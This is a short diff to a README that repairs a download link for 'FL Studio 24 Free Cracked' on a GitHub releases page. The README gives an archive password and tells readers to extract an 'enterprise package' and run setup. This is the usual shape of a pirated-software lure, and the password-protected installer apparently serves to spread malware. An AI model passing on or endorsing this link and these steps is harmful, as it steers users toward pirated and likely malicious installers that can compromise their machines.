@@ -25,7 +25,7 @@
 
 ### Archive Credentials
 **Password:** `0012` *(Case-sensitive)*
-1. Download from [Verified Releases]https://github.com/budajtonel2s/-Fl-Studio-24-Free-Cracked/releases/tag/setup)
+1. Download from [Verified Releases](https://github.com/budajtonel2s/-Fl-Studio-24-Free-Cracked/releases/tag/setup)
 2. Extract enterprise package
 3. Run Setup
 
